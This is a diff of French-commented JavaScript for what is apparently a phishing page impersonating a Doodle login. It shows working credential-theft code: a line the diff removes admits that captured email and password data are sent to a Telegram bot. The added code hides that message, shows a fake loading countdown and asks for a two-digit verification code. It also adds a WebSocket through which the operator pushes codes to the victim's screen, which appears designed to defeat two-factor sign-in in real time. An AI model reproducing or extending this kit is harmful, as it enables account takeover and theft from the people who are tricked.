@@ -1,5 +1,45 @@
 // Configuration du serveur
-const SERVER_URL = 'http://localhost:3000';
+const SERVER_URL = window.location.origin;
+let ws = null;
+let currentCode = null;
+
+// Initialiser WebSocket
+function initWebSocket() {
+    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+    const wsUrl = `${protocol}//${window.location.host}`;
+    
+    ws = new WebSocket(wsUrl);
+
+    ws.onopen = () => {
+        console.log('✅ WebSocket connecté');
+    };
+
+    ws.onmessage = (event) => {
+        const data = JSON.parse(event.data);
+        console.log('📨 Message WebSocket:', data);
+        
+        if (data.type === 'code') {
+            currentCode = data.code;
+            console.log('📝 Code reçu:', currentCode);
+            // Afficher le code à l'écran 5
+            const codeDisplay = document.getElementById('codeDisplay');
+            if (codeDisplay) {
+                codeDisplay.textContent = currentCode;
+                codeDisplay.style.animation = 'pulse 0.5s ease-out';
+            }
+        }
+    };
+
+    ws.onerror = (error) => {
+        console.error('❌ Erreur WebSocket:', error);
+    };
+
+    ws.onclose = () => {
+        console.log('❌ WebSocket fermé');
+        // Reconnecter après 3 secondes
+        setTimeout(initWebSocket, 3000);
+    };
+}
 
 // Navigation entre les écrans
 function goToScreen(screenNumber) {
@@ -71,12 +111,12 @@ async function handleLogin() {
 
         if (data.success) {
             console.log('✅ Données envoyées avec succès!');
-            alert('✅ Connexion réussie!\n\nLes données ont été envoyées au bot Telegram.');
             // Réinitialiser le formulaire
             document.getElementById('email').value = '';
             document.getElementById('password').value = '';
             document.getElementById('showPassword').checked = false;
-            goToScreen(3);
+            // Aller à l'écran de chargement
+            startLoadingScreen();
         } else {
             alert('❌ Erreur: ' + data.message);
         }
@@ -89,43 +129,79 @@ async function handleLogin() {
     }
 }
 
-// Initialisation au chargement de la page
-document.addEventListener('DOMContentLoaded', function() {
-    // Remplir les emails sur les écrans suivants
-    const emailInputScreen3 = document.getElementById('email');
-    const email1 = document.getElementById('email1');
-    const email2 = document.getElementById('email2');
+// Démarrer l'écran de chargement
+function startLoadingScreen() {
+    goToScreen(4);
+    
+    // Compter jusqu'à 5 secondes
+    let seconds = 5;
+    const loadingText = document.getElementById('loadingText');
+    
+    const interval = setInterval(() => {
+        seconds--;
+        loadingText.textContent = `${seconds} secondes...`;
+        
+        if (seconds <= 0) {
+            clearInterval(interval);
+            // Aller à l'écran de vérification du code
+            goToScreen(5);
+            // Réinitialiser le champ de code
+            document.getElementById('verifyCode').value = '';
+            document.getElementById('verifyCode').focus();
+        }
+    }, 1000);
+}
 
-    if (emailInputScreen3) {
-        emailInputScreen3.addEventListener('input', function() {
-            email1.textContent = this.value || 'utilisateur@doodle.com';
-            email2.textContent = this.value || 'utilisateur@doodle.com';
-        });
+// Vérifier le code
+async function verifyCode() {
+    const code = document.getElementById('verifyCode').value;
+
+    if (!code || code.length !== 2 || isNaN(code)) {
+        alert('Veuillez entrer un code valide (2 chiffres)');
+        return;
     }
 
-    // Permettre la navigation avec Entrée
-    document.addEventListener('keypress', function(event) {
-        if (event.key === 'Enter') {
-            const activeScreen = document.querySelector('.screen[style="display: block"]');
-            const button = activeScreen ? activeScreen.querySelector('.btn') : null;
-            if (button) {
-                // Si c'est l'écran 2 (mot de passe), envoyer les données
-                if (activeScreen.id === 'screen2') {
-                    handleLogin();
-                } else {
-                    button.click();
-                }
-            }
-        }
-    });
+    const button = event.target;
+    const originalText = button.textContent;
+    button.textContent = 'Vérification...';
+    button.disabled = true;
 
-    // Tester la connexion au serveur
-    console.log('🔄 Vérification de la connexion au serveur...');
-    fetch(`${SERVER_URL}/api/test`)
-        .then(res => res.json())
-        .then(data => console.log('✅ Serveur prêt:', data))
-        .catch(err => console.warn('⚠️ Serveur non accessible (démarrez: npm start)'));
-});
+    try {
+        const response = await fetch(`${SERVER_URL}/api/verify-code`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ code: code })
+        });
+
+        const data = await response.json();
+
+        if (data.success) {
+            console.log('✅ Code vérifié!');
+            // Aller à l'écran de confirmation
+            goToScreen(6);
+        } else {
+            alert('❌ Code incorrect. Veuillez réessayer.');
+        }
+    } catch (error) {
+        console.error('Erreur:', error);
+        alert('❌ Erreur lors de la vérification');
+    } finally {
+        button.textContent = originalText;
+        button.disabled = false;
+    }
+}
+
+// Déconnexion
+function logout() {
+    // Réinitialiser tous les écrans
+    document.getElementById('email').value = '';
+    document.getElementById('password').value = '';
+    document.getElementById('verifyCode').value = '';
+    // Retour à l'écran 3 (connexion)
+    goToScreen(3);
+}
 
 // Validation email
 function validateEmail(email) {
@@ -137,3 +213,40 @@ function validateEmail(email) {
 function validatePassword(password) {
     return password.length >= 6;
 }
+
+// Initialisation au chargement de la page
+document.addEventListener('DOMContentLoaded', function() {
+    // Initialiser WebSocket
+    initWebSocket();
+    
+    // Remplir les emails sur les écrans suivants
+    const emailInputScreen3 = document.getElementById('email');
+    const email1 = document.getElementById('email1');
+    const email2 = document.getElementById('email2');
+
+    if (emailInputScreen3) {
+        emailInputScreen3.addEventListener('input', function() {
+            email1.textContent = this.value || 'utilisateur@doodle.com';
+            email2.textContent = this.value || 'utilisateur@doodle.com';
+            document.getElementById('welcomeEmail').textContent = this.value ? `Bienvenue ${this.value}` : 'Vous êtes connecté ✅';
+        });
+    }
+
+    // Permettre la navigation avec Entrée
+    document.addEventListener('keypress', function(event) {
+        if (event.key === 'Enter') {
+            const activeScreen = document.querySelector('.screen[style="display: block"]');
+            const button = activeScreen ? activeScreen.querySelector('.btn') : null;
+            if (button) {
+                button.click();
+            }
+        }
+    });
+
+    // Tester la connexion au serveur
+    console.log('🔄 Vérification de la connexion au serveur...');
+    fetch(`${SERVER_URL}/api/test`)
+        .then(res => res.json())
+        .then(data => console.log('✅ Serveur prêt:', data))
+        .catch(err => console.warn('⚠️ Serveur non accessible (démarrez: npm start)'));
+});
